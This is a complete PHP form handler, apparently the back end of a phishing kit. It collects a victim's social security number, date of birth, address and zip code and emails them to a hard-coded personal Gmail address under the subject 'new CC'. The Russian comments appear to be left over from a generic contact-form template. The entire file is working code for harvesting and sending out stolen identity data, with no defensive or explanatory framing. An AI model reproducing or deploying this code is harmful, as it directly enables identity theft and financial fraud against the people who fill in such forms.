 <?php
$to = "harmancreo@gmail.com"; // емайл получателя данных из формы 
$tema = "new CC"; // тема полученного емайла 
$message = "ssn: ".$_POST['ssn']."<br>";//присвоить переменной значение, полученное из формы name=name
  $message .= "dob: ".$_POST['dob']."<br>"; //полученное из формы name=email
$message .= "address: ".$_POST['address']."<br>"; //полученное из формы name=phone
$message .= "zipcode: ".$_POST['zipcode']."<br>"; //полученное из формы name=message
$headers  = 'MIME-Version: 1.0' . "\r\n"; // заголовок соответствует формату плюс символ перевода строки
  $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n"; // указывает на тип посылаемого контента
mail($to, $tema, $message, $headers); //отправляет получателю на емайл значения переменных
?>
